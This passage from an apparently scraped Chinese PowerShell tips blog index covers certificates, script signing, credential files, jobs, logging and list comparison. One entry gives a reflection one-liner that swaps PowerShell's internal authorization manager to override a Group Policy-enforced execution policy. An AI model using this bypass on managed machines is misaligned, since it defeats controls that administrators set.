CN=SecurityDepartment 证书对象包含了一系列方法： 1234567891011121314151617181920212223242526272829303132333435PS C:\\&gt; $cert | Get-Member -MemberType *Method TypeName: System.Security.Cryptography.X509Certificates.X509Certificate2Name MemberType Definition---- ---------- ----------Dispose Method void Dispose(), void IDisposable.Dispose()Equals Method bool Equals(System.Object obj), bool Equals(X509Certificate other)Export Method byte[] Export(System.Security.Cryptography.X509Certificates.X509ContentType contentType), byte[] Export(System.Sec...GetCertHash Method byte[] GetCertHash()GetCertHashString Method string GetCertHashString()GetEffectiveDateString Method string GetEffectiveDateString()GetExpirationDateString Method string GetExpirationDateString()GetFormat Method string GetFormat()GetHashCode Method int GetHashCode()GetIssuerName Method string GetIssuerName()GetKeyAlgorithm Method string GetKeyAlgorithm()GetKeyAlgorithmParameters Method byte[] GetKeyAlgorithmParameters()GetKeyAlgorithmParametersString Method string GetKeyAlgorithmParametersString()GetName Method string GetName()GetNameInfo Method string GetNameInfo(System.Security.Cryptography.X509Certificates.X509NameType nameType, bool forIssuer)GetObjectData Method void ISerializable.GetObjectData(System.Runtime.Serialization.SerializationInfo info, System.Runtime.Serialization...GetPublicKey Method byte[] GetPublicKey()GetPublicKeyString Method string GetPublicKeyString()GetRawCertData Method byte[] GetRawCertData()GetRawCertDataString Method string GetRawCertDataString()GetSerialNumber Method byte[] GetSerialNumber()GetSerialNumberString Method string GetSerialNumberString()GetType Method type GetType()Import Method void Import(byte[] rawData), void Import(byte[] rawData, string password, System.Security.Cryptography.X509Certifi...OnDeserialization Method void IDeserializationCallback.OnDeserialization(System.Object sender)Reset Method void Reset()ToString Method string ToString(), string ToString(bool verbose)Verify Method bool Verify() 例如，如果您想验证证书是否合法，只需要调用 Verify() 方法。结果是一个布尔值，$false 代表证书不被 Windows 信任。 明天，我们将会使用证书对 PowerShell 脚本进行数字签名。","link":"/2017/11/01/loading-certificates-from-pfx-files/"},{"title":"PowerShell 技能连载 - 对 PowerShell 脚本进行数字签名","text":"在前一个技能中您学习了如何创建一个自签名的代码签名证书、将证书保存为一个 PFX 文件，并且将它加载进内存。 今天，假设您已经有了一个包含代码签名证书的 PFX 文件，我们将看看如何对 PowerShell 脚本进行数字签名。 以下代码在您的用户配置文件中查找所有 PowerShell 脚本，如果脚本还未经过数字签名，将会从 PFX 文件中读取一个证书对它进行签名： 12345678910111213# read in the certificate from a pre-existing PFX file$cert = Get-PfxCertificate -FilePath &quot;$env:temp\\codeSignCert.pfx&quot;# find all scripts in your user profile...Get-ChildItem -Path $home -Filter *.ps1 -Include *.ps1 -Recurse -ErrorAction SilentlyContinue |# ...that do not have a signature yet...Where-Object { ($_ | Get-AuthenticodeSignature).Status -eq 'NotSigned' } |# and apply one# (note that we added -WhatIf so no signing occurs. Remove this only if you# really want to add digital signatures!)Set-AuthenticodeSignature -Certificate $cert -WhatIf 当您在编辑器中查看这些脚本时，您将在脚本的底部看到一个新的注释段。它包含了使用证书加密的脚本的哈希值。他也包含了证书的公开信息。 当您右键点击一个签名的脚本并且选择“属性”，可以看到谁对脚本做了签名。如果您确实信任这个人，您可以将它们的证书安装到受信任的根证书中。 一旦脚本经过数字签名，就可以很方便地审查脚本状态。签名可以告诉您谁签名了一个脚本，以及脚本的内容是否被纂改过。以下代码检查用户配置文件中所有的 PowerShell 脚本并显示签名状态： 1234# find all scripts in your user profile...Get-ChildItem -Path $home -Filter *.ps1 -Include *.ps1 -Recurse -ErrorAction SilentlyContinue |# ...and check signature statusGet-AuthenticodeSignature 如果您收到“UnknownError”消息，这并不代表是一个未知错误，而是代表脚本未受纂改但签名在系统中是未知的（或非受信的）。","link":"/2017/11/02/digitally-signing-powershellscripts/"},{"title":"PowerShell 技能连载 - 结合时间戳服务器使用数字签名","text":"当您对脚本文件签名时，会希望签名保持完整，即便为它签名的证书将来过期了。关键的是证书在签名的时候是合法的。 要确保这一点，您需要一个受信的机构提供的时间戳服务器。通过这种方式，您不仅是对一个脚本签名，而且添加了签名的时间。在证书有效期内，一切没有问题。 我们调整了前一个技能中的代码，并且添加了一个时间戳服务器的 URL。以下代码对用户数据文件中所有未签名的脚本文件增加签名。如果您确定要对您的脚本文件增加签名，请移除 -WhatIf 参数： 12345678910111213# read in the certificate from a pre-existing PFX file$cert = Get-PfxCertificate -FilePath &quot;$env:temp\\codeSignCert.pfx&quot;# find all scripts in your user profile...Get-ChildItem -Path $home\\Documents -Filter *.ps1 -Include *.ps1 -Recurse -ErrorAction SilentlyContinue |# ...that do not have a signature yet...Where-Object { ($_ | Get-AuthenticodeSignature).Status -eq 'NotSigned' } |# and apply one# (note that we added -WhatIf so no signing occurs. Remove this only if you# really want to add digital signatures!)Set-AuthenticodeSignature -Certificate $cert -TimestampServer http://timestamp.digicert.com -WhatIf","link":"/2017/11/03/using-digital-signatures-with-timestamp-server/"},{"title":"PowerShell 技能连载 - Multipass: 安全存储多个凭据","text":"If you’d like to safely store credentials (usernames and password) for your personal use in a file, here is a very simple yet extremely powerful approach. Take a look at this code: $Path = &quot;$home\\Desktop\\multipass.xml&quot; [PSCustomObject]@{ User1 = Get-Credential -Message User1 User2 = Get-Credential -Message User2 User3 = Get-Credential -Message User3 } | Export-Clixml -Path $Path When you run it, it asks for three credentials and saves them to a “multipass” file on your desktop. All passwords are safely encrypted with your identity and your machines identity (which is why the file can only be read by you, and only on the machine where it was created). To later on use one of the credentials, this is how you read them back in: $multipass = Import-Clixml -Path $Path You can then access the credentials via the properties “User1”, “User2”, and “User3”, and use the credentials in your scripts wherever a cmdlet asks for a credential: PS C:\\&gt; $multipass.User1 UserName Password -------- -------- AlbertK System.Security.SecureString","link":"/2017/11/07/multipass-securely-storing-multiple-credentials/"},{"title":"PowerShell 技能连载 - 一个更好（更快）的 Start-Job","text":"Start-Job 将一个脚本块发送到一个新的 PowerShell 进程，这样它可以独立并行运行。以下是一个非常简单的例子，演示 job 背后的概念： 12345678910111213141516171819202122# three separate &quot;jobs&quot; to do:$job1 = { Start-Sleep -Seconds 6 ; 1 }$job2 = { Start-Sleep -Seconds 8 ; 2 }$job3 = { Start-Sleep -Seconds 5 ; 3 }# execute two of them in background jobs$j1 = Start-Job -ScriptBlock $job1$j3 = Start-Job -ScriptBlock $job3# execute one in our own process$ej2 = &amp; $job2# wait for all to complete$null = Wait-Job -Job $J1, $j3# get the results and clean up$ej1 = Receive-Job -Job $j1$ej3 = Receive-Job -Job $j3Remove-Job -Job $j1, $j3# work with the results$ej1, $ej2, $ej3 如果不用 job，那么需要等待 19 秒。幸好有了 job，这个过程可以缩短到 8 秒。 然而，也有副作用。由于 job 是在独立的应用中执行的，数据必须以 XML 序列化的方式来回传递。job 要传回越多的数据，就需要越多的时间。有些时候这个副作用会盖过了优点。 一个更好的方是在原来的 PowerShell 实例的子线程中运行 job。以下代码演示这种功能。它创建了一个新的名为 Start-MemoryJob 的命令，可以替代 Start-Job。其余的代码完全不用改变。 使用 Start-MemoryJob，不需要任何对象序列化。您的 job 可以快速平滑地运行，而没有返回大量的数据。而且，您现在获取到的是原始的对象。不再需要处理序列化过的对象。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153$code = @'using System;using System.Collections.Generic;using System.Text;using System.Management.Automation;using System.Management.Automation.Runspaces;namespace InProcess{ public class InMemoryJob : System.Management.Automation.Job { public InMemoryJob(ScriptBlock scriptBlock, string name) { _PowerShell = PowerShell.Create().AddScript(scriptBlock.ToString()); SetUpStreams(name); } public InMemoryJob(PowerShell PowerShell, string name) { _PowerShell = PowerShell; SetUpStreams(name); } private void SetUpStreams(string name) { _PowerShell.Streams.Verbose = this.Verbose; _PowerShell.Streams.Error = this.Error; _PowerShell.Streams.Debug = this.Debug; _PowerShell.Streams.Warning = this.Warning; _PowerShell.Runspace.AvailabilityChanged += new EventHandler&lt;RunspaceAvailabilityEventArgs&gt;(Runspace_AvailabilityChanged); int id = System.Threading.Interlocked.Add(ref InMemoryJobNumber, 1); if (!string.IsNullOrEmpty(name)) { this.Name = name; } else { this.Name = &quot;InProcessJob&quot; + id; } } void Runspace_AvailabilityChanged(object sender, RunspaceAvailabilityEventArgs e) { if (e.RunspaceAvailability == RunspaceAvailability.Available) { this.SetJobState(JobState.Completed); } } PowerShell _PowerShell; static int InMemoryJobNumber = 0; public override bool HasMoreData { get { return (Output.Count &gt; 0); } } public override string Location { get { return &quot;In Process&quot;; } } public override string StatusMessage { get { return &quot;A new status message&quot;; } } protected override void Dispose(bool disposing) { if (disposing) { if (!isDisposed) { isDisposed = true; try { if (!IsFinishedState(JobStateInfo.State)) { StopJob(); } foreach (Job job in ChildJobs) { job.Dispose(); } } finally { base.Dispose(disposing); } } } } private bool isDisposed = false; internal bool IsFinishedState(JobState state) { return (state == JobState.Completed || state == JobState.Failed || state ==JobState.Stopped); } public override void StopJob() { _PowerShell.Stop(); _PowerShell.EndInvoke(_asyncResult); SetJobState(JobState.Stopped); } public void Start() { _asyncResult = _PowerShell.BeginInvoke&lt;PSObject, PSObject&gt;(null, Output); SetJobState(JobState.Running); } IAsyncResult _asyncResult; public void WaitJob() { _asyncResult.AsyncWaitHandle.WaitOne(); } public void WaitJob(TimeSpan timeout) { _asyncResult.AsyncWaitHandle.WaitOne(timeout); } }}'@Add-Type -TypeDefinition $codefunction Start-JobInProcess{ [CmdletBinding()] param ( [scriptblock] $ScriptBlock, $ArgumentList, [string] $Name ) function Get-JobRepository { [cmdletbinding()] param() $pscmdlet.JobRepository } function Add-Job { [cmdletbinding()] param ( $job ) $pscmdlet.JobRepository.Add($job) } if ($ArgumentList) { $PowerShell = [PowerShell]::Create().AddScript($ScriptBlock).AddArgument($argumentlist) $MemoryJob = New-Object InProcess.InMemoryJob $PowerShell, $Name } else { $MemoryJob = New-Object InProcess.InMemoryJob $ScriptBlock, $Name } $MemoryJob.Start() Add-Job $MemoryJob $MemoryJob}","link":"/2017/11/06/a-better-and-faster-start-job/"},{"title":"PowerShell 技能连载 - 压缩序列化的数据","text":"通过 Export-CliXml 命令可以很方便地将处理结果保存到文件通过 Import-CliXml 命令，序列化的信息可以同样方便地恢复。然而，生成的 XML 文件可能非常大。 幸运的是，在 PowerShell 5 中有一个新的命令名叫 Compress-Archieve。当您创建了 XML 文件之后，您可以自动地将它转为一个 ZIP 文件。 以下是一些演示代码：它获取一个进程列表并且保存到 XML 文件。然后将 XML 文件压缩为 ZIP，并且删除原始的 XML 文件。 这么做的效率很高，因为 XML 是文本文件。您常常能看到压缩率在 3-5%（ZIP 的文件大小是原始文件的 3-5%）： 12345678910111213141516$Path = &quot;$env:TEMP\\data1.xml&quot;# serialize data (results in large text files)Get-Process | Export-Clixml -Path $Path$length1 = (Get-Item -Path $Path).Length$ZipPath = [IO.Path]::ChangeExtension($Path, &quot;.zip&quot;)Compress-Archive -Path $Path -Destination $ZipPath -CompressionLevel Optimal -ForceRemove-Item -Path $Path$length2 = (Get-Item -Path $ZipPath).Length$compression = $length2 * 100 / $length1&quot;Compression Ratio {0:n2} %&quot; -f $compression","link":"/2017/11/08/compressing-serialized-data/"},{"title":"PowerShell 技能连载 - 解压序列化的数据","text":"在前一个技能中您学习到了如何使用 Export-CliXml 命令来序列化数据并且用 Compress-Archive 将巨大的 XML 文件压缩成远远小于原始文件的尺寸。 今天，我们进行相反的操作：假设获得一个包含 XML 序列化数据的 ZIP 文件，然后恢复序列化的对象。当然这假设您已基于昨天的技能创建了这样的文件。 12345678910111213141516# path to existing ZIP file$ZipPath = &quot;$env:TEMP\\data1.zip&quot;# by convention, XML file inside the ZIP file has the same name$Path = [IO.Path]::ChangeExtension($ZipPath, &quot;.xml&quot;)# expand ZIP fileExpand-Archive -Path $ZipPath -DestinationPath $env:temp -Force# deserialize objects$objects = Import-Clixml -Path $Path# remove XML file againRemove-Item -Path $Path -Recurse -Force$objects | Out-GridView","link":"/2017/11/09/uncompressing-serialized-data/"},{"title":"PowerShell 技能连载 - 从字符串中移除文本","text":"有时候，您也许听说过 Trim()、TrimStart() 和 TrimEnd() 可以 移除字符串中的文本。并且它们工作起来很正常： 12345PS C:\\&gt; $testvalue = &quot;this is strange&quot;PS C:\\&gt; $testvalue.TrimEnd(&quot;strange&quot;)this isPS C:\\&gt; 但是这个呢： 12345PS C:\\&gt; $testvalue = &quot;this is strange&quot;PS C:\\&gt; $testvalue.TrimEnd(&quot; strange&quot;)this iPS C:\\&gt; 实际情况是 Trim() 方法将您的参数视为一个字符的列表。所有这些字符都将被移除。 如果您只是想从字符串的任意位置移除文本，请使用 Replace() 来代替： 1234PS C:\\&gt; $testvalue.Replace(&quot; strange&quot;, &quot;&quot;)this isPS C:\\&gt; 如果您需要进一步的控制，请使用正则表达式和锚定。要只从字符串的尾部移除文本，以下代码可以实现这个功能。只有结尾部分的 “strange” 字符串会被移除。 1234567$testvalue = &quot;this is strange strange strange&quot;$searchText = [Regex]::Escape(&quot;strange&quot;)$anchorTextEnd = &quot;$&quot;$pattern = &quot;$searchText$anchorTextEnd&quot;$testvalue -replace $pattern","link":"/2017/11/10/removing-text-from-strings/"},{"title":"PowerShell 技能连载 - 多语言语音输出","text":"在 Windows 10 上，操作系统自带了一系列高质量的文本转语言引擎，而且不局限于英文。可用的 TTS 引擎数量依赖于您所安装的语言。 PowerShell 可以发送文本到这些 TTS 引擎，并且通过 tag 可以控制使用的语言。所以如果您同时安装了英语和德语的 TTS 引擎，您可以像下面这样混用不同的语言： 123456789$text = &quot;&lt;LANG LANGID=&quot;&quot;409&quot;&quot;&gt;Your system will restart now!&lt;/LANG&gt;&lt;LANG LANGID=&quot;&quot;407&quot;&quot;&gt;&lt;PITCH MIDDLE = '2'&gt;Oh nein, das geht nicht!&lt;/PITCH&gt;&lt;/LANG&gt;&lt;LANG LANGID=&quot;&quot;409&quot;&quot;&gt;I don't care baby&lt;/LANG&gt;&lt;LANG LANGID=&quot;&quot;407&quot;&quot;&gt;Ich rufe meinen Prinz! Herbert! Tu was!&lt;/LANG&gt;&quot;$speaker = New-Object -ComObject Sapi.SpVoice$speaker.Rate = 0$speaker.Speak($text) 如果您希望使用不同的语言，只需要将 LANGID 数字调整为您希望使用的文化代号。","link":"/2017/11/13/multi-language-voice-output/"},{"title":"PowerShell 技能连载 - 轻松记录脚本日志","text":"从 PowerShell 5 开始，您可以在任何宿主中使用 Strart-Transcript 来记录脚本的所有输出内容。以下是向各种脚本轻松添加日志的方法： 12345678910111213141516# add this: ############################$logFile = &quot;$PSScriptRoot\\mylog.txt&quot;Start-Transcript -Path $logFile -Append#########################################&quot;Hello&quot;($a = Get-Service)&quot;I received $($a.Count) services.&quot;Write-Host &quot;Watch out: direct output will not be logged!&quot;# end logging ###########################Stop-Transcript######################################### 只需要将注释块中的代码添加到脚本的开始和结束处。日志文件将会在脚本所在的目录创建。由于 $logFile 使用 $PSScriptRoot（脚本的当前文件夹），请确保已经将脚本保存并以脚本的方式运行。否则，$PSScriptRoot 变量可能为空。 只需要确保脚本输出所有您需要的信息，就可以在 logfile 中看到它。例如将赋值语句放在括号中，PowerShell 将不只是赋值，而且将它们输出到 output。 警告：除了用 Write-Host 直接写到宿主的信息，所有输入输出信息都将被记录下。这些信息只能在屏幕上看到。","link":"/2017/11/14/script-logging-made-easy/"},{"title":"PowerShell 技能连载 - Working with [FileInfo] Object","text":"Often, code needs to check on files, and for example test whether the file exists or exceeds a given size. Here is some commonly used code: $logFile = &quot;$PSScriptRoot\\mylog.txt&quot; $exists = Test-Path -Path $logFile if ($exists) { $data = Get-Item -Path $logFile if ($data.Length -gt 100KB) { Remove-Item -Path $logFile } } By immediately converting a string path into a FileInfo object, you can do more with less: [System.IO.FileInfo]$logFile = &quot;$PSScriptRoot\\mylog.txt&quot; if ($logFile.Exists -and $logFile.Length -gt 0KB) { Remove-Item -Path $logFile } You can convert any path to a FileInfo object, even if it is not representing a file. That’s what the property “Exists” is for: it tells you whether the file is present or not. ReTweet this Tip!","link":"/2017/11/15/working-with-fileinfo-object/"},{"title":"PowerShell 技能连载 - Getting File Extension","text":"By converting a path to a FileInfo object, you can easily determine the path parent folder or file extension. Have a look: ([IO.FileInfo]'c:\\test\\abc.ps1').Extension ([IO.FileInfo]'c:\\test\\abc.ps1').DirectoryName","link":"/2017/11/16/getting-file-extension/"},{"title":"PowerShell 技能连载 -用 Windows 事件日志记录脚本日志","text":"使用内置的 Windows 事件日志架构来记录脚本日志是很棒的方法，而且非常简单。以下是准备日志记录的初始步骤（需要管理员特权）： 1234#requires -runasadministratorNew-EventLog -LogName PSScriptLog -Source Logon, Installation, Misc, SecretLimit-EventLog -LogName PSScriptLog -MaximumSize 10MB -OverflowAction OverwriteAsNeeded 您可能需要改变日志的名称以及（或）错误源的名称。如果名字没有被占用，这些源可以起任意名称。 现在，每个普通用户可以使用以下代码来写入新的事件日志： 1Write-EventLog -LogName PSScriptLog -Source Logon -EntryType Warning -EventId 123 -Message &quot;Problem in script $PSCommandPath&quot; 请注意 Write-EventLog 使用和前面定义相同的 logfile，并且 source 名称必须是前面定义过的之一。 但脚本写入信息到日志文件后，您可以搜索日志或者用 Get-EventLog 创建报告： 1PS C:\\&gt; Get-EventLog -LogName PSScriptLog -EntryType Error -Message *test.ps1*","link":"/2017/11/17/using-windows-eventlog-for-script-logging/"},{"title":"PowerShell 技能连载 - 临时禁用 PSReadLine 模块","text":"从 PowerShell 5 开始，PowerShell 控制台支持彩色文本特性，以及一系列由 PSReadLine 模块提供的新特性。 如果您从更早的 PowerShell 版本升级到 PowerShell 5，而丢失了彩色文本功能，那么您可以从 PSGallery 下载和安装 PSReadLine 模块： 1PS C:\\&gt; Install-Module -Name PSReadLine -Scope CurrentUser 类似地，如果您的 PS5+ 控制台和以前的行为不一致，例如不会执行粘贴入的代码块，那么您可以临时禁止该模块： 12345# disable PS5+ console handler temporarilyRemove-Module psreadline# re-enable PS5+ console handler againImport-Module psreadline","link":"/2017/11/20/temporarily-disabling-psreadline-module/"},{"title":"PowerShell 技能连载 - 极简的错误处理","text":"错误处理不必做的很复杂。它可以简单到检测上一条命令是否执行成功： 1234567# suppress errors by default$ErrorActionPreference = 'SilentlyContinue'# if a command runs into an error...Get-Process -Name zumsel# ...then $? is $false, and you can exit PowerShell# with a return value, i.e. 55if (!$?) { exit 55 } PowerShell 将上一个命令是否遇到错误的信息记录在 $? 变量中。在这个例子中，返回的是 $false。使用 exit 加上一个正数，就可以退出脚本，并且将退出码返回给调用者。","link":"/2017/11/21/minimalistic-error-handling/"},{"title":"PowerShell 技能连载 - 理解 PowerShell 中 .NET 类型名称的变体","text":"PowerShell 使用 .NET 类型名，例如将值转换为指定的类型。脚本中常常可以使用各种格式来定义 .NET 类型。以下是它们各自的用意和含义： 12345678# short name for &quot;Integer&quot; data type[int]12.4# official .NET type name[system.int32]12.4# here is how you get there[int].FullName# with official names, the namespace &quot;System&quot; is always optional[int32]12.4 简单来说，PowerShell 维护着它自己的“类型加速器”：.NET 类型的别名。查看任意类型的 FullName 属性，可以获得完整正式的 .NET 类型名。类型名前面的 “System.” 是可以省略的。","link":"/2017/11/22/understanding-net-type-name-variants-in-powershell/"},{"title":"PowerShell 技能连载 - 从 .PSD1 文件中读取数据","text":"一个脚本有多种方法可以保存数据信息。有一种方式特别方便。以下是实现的代码： 123Import-LocalizedData -BaseDirectory $PSScriptRoot -FileName data.psd1 -BindingVariable Info$Info 请确保将这段代码保存为一个脚本。然后在同一个文件夹中创建另一个文件，并命名为 “data.psd1”，然后增加这段内容： 12345@{ Name = 'Tobias' ID = 12 Path = 'c:\\Windows'} 当两个文件都放在目录下时，运行脚本。它将读取 data.psd1 并将它的内容返回为一个哈希表。请注意 Import-LocalizedData 默认情况下并不能将 .psd1 文件作为活动的内容来处理。当 data.psd1 中的哈希表包含命令和变量时，它不可以读取——防止黑客纂改数据文件内容。 如果您在文件夹中添加了子文件夹，并且命名为语言区域性 ID，例如 “de-de” 和 “en-us”，Import-LocalizedData 将会自动检测合适的子目录并且从中读取文件（假设您将数据文件的本地化拷贝放在这些文件夹中）。该 cmdlet 将使用 $PSCulture 中提供的语言区域设置，或者如果指定了 -UICulture，将使用该设置。","link":"/2017/11/23/reading-data-from-psd1-files/"},{"title":"PowerShell 技能连载 - 在 PowerShell 5+ 中读取 .PSD1 文件","text":"在前一个技能中我们介绍了通过 Import-LocalizedData 读取存储在 .psd1 文件中的数据。 从 PowerShell 5 开始，有一个新的cmdlet名为 Import-PowerShellDataFile。您可以用它安全地从 .psd1 文件中读取数据。类似 Import-LocalizedData，这个cmdlet只接受没有活动内容（没有命令和变量）的 .psd1 文件。 以下是您需要的脚本： 12$path = &quot;$PSScriptRoot\\data.psd1&quot;$infos = Import-PowerShellDataFile -Path $path 将数据文件存放在相同文件夹下，将它命名为 data.psd1，然后设为如下内容： 12345@{ Name = 'Tobias' ID = 12 Path = 'c:\\Windows'} 当您运行这段脚本时，它将 .psd1 文件中的数据以哈希表的形式返回。","link":"/2017/11/24/reading-data-from-psd1-files-in-powershell-5/"},{"title":"PowerShell 技能连载 - 将哈希表转换为 JSON","text":"在前一个技能中我们大量操作了哈希表，甚至从 .psd1 文件中读取。如果您需要不同格式的数据，例如 JSON，那么转换工作很简单。需要做的只是先将哈希表转换为一个对象： 123456789$hash = @{ Name = 'Tobias' ID = 12 Path = 'c:\\windows'}$object = [PSCustomObject]$hash$object | ConvertTo-Json 当哈希表转换为一个对象以后，您可以将它用管道传递给 ConvertTo-Json，或其它的 ConvertTo-* 指令。","link":"/2017/11/27/converting-hash-tables-to-json/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中切换注释","text":"PowerShell ISE 暴露了一些可扩展的组件。例如，如果您希望按下 CTRL+K 切换选中文本的注释状态，请试试这段代码： 123456789101112131415function Toggle-Comment{ $file = $psise.CurrentFile $text = $file.Editor.SelectedText if ($text.StartsWith(&quot;&lt;#&quot;)) { $comment = $text.Substring(3).TrimEnd(&quot;#&gt;&quot;) } else { $comment = &quot;&lt;#&quot; + $text + &quot;#&gt;&quot; } $file.Editor.InsertText($comment)}$psise.CurrentPowerShellTab.AddOnsMenu.Submenus.Add('Toggle Comment', { Toggle-Comment }, 'CTRL+K') 它基本上是使用 $psise 来操作 ISE 对象模型，然后安装一个快捷键为 CTRL+K 的新的菜单命令来调用 Toggle-Comment 函数。 在位于 $profile 的用户配置文件脚本中（这个路径可能还不存在）增加这段代码，PowerShell ISE 每次启动的时候就会自动运行这段代码。","link":"/2017/11/28/toggling-comments-in-powershell-ise/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中添加单行注释","text":"在前一个技能中，我们学习了针对 PowerShell ISE 的命令扩展。以下是另一个例子，增加 CTRL+K 键盘快捷键，在选中的每一行尾部添加注释 (#)。 12345678function Invoke-Comment{ $file = $psise.CurrentFile $comment = ($file.Editor.SelectedText -split '\\n' | ForEach-Object { &quot;#$_&quot; }) -join &quot;`n&quot; $file.Editor.InsertText($comment)}$psise.CurrentPowerShellTab.AddOnsMenu.Submenus.Add('Comment Out', { Invoke-Comment }, 'CTRL+K')","link":"/2017/11/29/adding-single-line-comments-in-powershell-ise/"},{"title":"PowerShell 技能连载 - 高效创建新的对象","text":"多数时候，大部分新对象都是静态数据，以属性的方式表示。一个特别有效的创建新的包含新属性的对象是将哈希表转换为对象——我们早些时候转换过： 12345$conf = [PSCustomObject]@{ Name = 'Tobias' Conf = 'psconf.eu' Url = 'http://psconf.eu'} 输出的结果是一个简单的对象，没有任何特别的方法： 12345PS C:\\&gt; $confName Conf Url---- ---- ---Tobias psconf.eu http://psconf.eu 要增加方法，请在随后使用 Add-Member 修饰该对象。这行代码增加一个新的 Register() 方法： 12$object | Add-Member -MemberType ScriptMethod -Name Register -Value { Start-Process -FilePath $this.url } 请注意脚本块代码如何通过 Register() 方法来存取 $this：$this 变量代表对象自身，所以即便您晚些时候才决定改变 “Url“ 属性，Register() 方法将仍然可以工作。 当您运行 Register() 方法，该对象打开 “Url“ 属性指定的 URL： 1PS C:\\&gt; $conf.Register()","link":"/2017/11/30/creating-new-objects-efficiently/"},{"title":"PowerShell 技能连载 - 为对象高效添加标记","text":"有时候您会见到用 Select-Object 向已有对象增加信息的脚本，类似以下代码： 123456Get-Process | Select-Object -Property *, Sender| ForEach-Object { $_.Sender = $env:COMPUTERNAME $_ } 这段代码可以工作，但是 Select-Object 创建了一个全新的对象拷贝，所以这种方法速度比较慢并且改变了对象的类型。因为这个原因，您会注意到 PowerrShell 不再像正常的那样以表格的方式输出。 Add-Member 是首选的增加额外信息到已有对象的 cmdlet，因为它不会拷贝对象并且不会改变对象类型。请比较输出结果： 12Get-Process | Add-Member -MemberType NoteProperty -Name Sender -Value $env:COMPUTERNAME -PassThru 对象类型没有改变，并且 PowerShell 继续使用进程查看缺省的输出布局。这是因为新的 “Sender” 属性初始是不可见的。不过它事实上存在： 123Get-Process | Add-Member -MemberType NoteProperty -Name Sender -Value $env:COMPUTERNAME -PassThru | Select-Object -Property Name, Id, Sender","link":"/2017/12/01/tagging-objects-efficiently/"},{"title":"PowerShell 技能连载 - 比较数字列表","text":"一个脚本常常需要对比两个列表是否相等，或者某个列表是否缺失了某个元素。这种情况下，您可以使用 HashSet，而不用手动写代码。请看： 123456789101112131415161718192021222324252627282930$set1 = New-Object System.Collections.Generic.HashSet[int32] (,[int[]]@(1,2,5,7,9,12))$set2 = New-Object System.Collections.Generic.HashSet[int32] (,[int[]]@(1,2,5,12,111))&quot;Original Sets:&quot;&quot;$set1&quot;&quot;$set2&quot;# in both$copy = New-Object 'System.Collections.Generic.HashSet[int32]' $set1$copy.IntersectWith($set2)&quot;In Both&quot;&quot;$copy&quot;# combine$copy = New-Object 'System.Collections.Generic.HashSet[int32]' $set1$copy.UnionWith($set2)&quot;All Combined&quot;&quot;$copy&quot;# exclusive$copy = New-Object 'System.Collections.Generic.HashSet[int32]' $set1$copy.ExceptWith($set2)&quot;Exclusive in Set 1&quot;&quot;$copy&quot;# exclusive either side$copy = New-Object 'System.Collections.Generic.HashSet[int32]' $set1$copy.SymmetricExceptWith($set2)&quot;Exclusive in both (no duplicates)&quot;&quot;$copy&quot; 这个例子演示了如何创建两个初始的集合：$set1 和 $set2。 要计算一个列表和另一个列表的差别，首先创建一个列表的工作拷贝，然后可以运用各种比较方法，将工作拷贝和另一个列表做比较。 结果可以在工作拷贝中直接查看。这是以上代码的执行结果： Original Sets: 1 2 5 7 9 12 1 2 5 12 111 In Both 1 2 5 12 All Combined 1 2 5 7 9 12 111 Exclusive in Set 1 7 9 Exclusive in both (no duplicates) 7 9 111","link":"/2017/12/04/comparing-numeric-lists/"},{"title":"PowerShell 技能连载 - 比较字符串列表","text":"在前一个例子中我们使用 HashSet 来对比数字列表，并查找哪些元素在两个列表中都出现，或只在一个列表中出现。 字符串列表也可以做相同的事。假设您有两个名字清单，并且希望知道哪些名字在两个名单中都出现，或只在一个名单中出现，请试试以下代码： 123456789101112131415161718192021222324252627282930$set1 = New-Object System.Collections.Generic.HashSet[string] (,[string[]]@('Harry','Mary','Terri'))$set2 = New-Object System.Collections.Generic.HashSet[string] (,[string[]]@('Tom','Tim','Terri','Tobias'))&quot;Original Sets:&quot;&quot;$set1&quot;&quot;$set2&quot;# in both$copy = New-Object System.Collections.Generic.HashSet[string] $set1$copy.IntersectWith($set2)&quot;In Both&quot;&quot;$copy&quot;# combine$copy = New-Object System.Collections.Generic.HashSet[string] $set1$copy.UnionWith($set2)&quot;All Combined&quot;&quot;$copy&quot;# exclusive$copy = New-Object System.Collections.Generic.HashSet[string] $set1$copy.ExceptWith($set2)&quot;Exclusive in Set 1&quot;&quot;$copy&quot;# exclusive either side$copy = New-Object System.Collections.Generic.HashSet[string] $set1$copy.SymmetricExceptWith($set2)&quot;Exclusive in both (no duplicates)&quot;&quot;$copy&quot; 以下是执行结果： Original Sets: Harry Mary Terri Tom Tim Terri Tobias In Both Terri All Combined Harry Mary Terri Tom Tim Tobias Exclusive in Set 1 Harry Mary Exclusive in both (no duplicates) Harry Mary Tobias Tom Tim","link":"/2017/12/05/comparing-string-lists/"},{"title":"PowerShell 技能连载 - 强制允许 PowerShell 脚本执行","text":"执行策略 (Execution Policy) 可以禁止脚本执行。它被设计成一个用户的首选项，所以您总是可以改变有关的执行策略。不过，在一些环境下，组策略可以强制改变设置，并且禁止运行脚本。 在这种情况下，您可以考虑重置内部的 PowerShell 授权管理。将它替换为一个缺省的实例以后，您可以忽略之前的执行策略设置，执行 PowerShell 脚本： 1$context = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext); $field = $context.gettype().getfield('_authorizationManager','nonpublic,instance'); $field.setvalue($context,(New-Object management.automation.authorizationmanager 'Microsoft.PowerShell')) 请注意，这不是一个安全问题。执行策略的控制权在用户。这并不是一个安全边界。","link":"/2017/12/06/allowing-powershell-script-execution---no-matter-what/"},{"title":"PowerShell 技能连载 - 理解文本转换","text":"有许多方法能将对象转换为文本。如果您在某些情况下弄糊涂了，这篇文章能帮您快速搞清。请看： 有三个基础的将对象转换为文本的方法。 1234567$a = 4.5# simple conversion$a.ToString()# slightly better conversion&quot;$a&quot;# richest conversion$a | Out-String 对于简单对象，三个方法的结果不会有差别。然而，对于更复杂的对象，结果差异可能很大。请看一下数组： 1234567$a = 1,2,3$a.ToString()&quot;$a&quot;$a | Out-String 并且看看复杂对象如何转换为文本： 1234567$a = Get-Process$a.ToString()&quot;$a&quot;$a | Out-String","link":"/2017/12/07/understanding-text-conversions/"},{"title":"PowerShell 技能连载 - 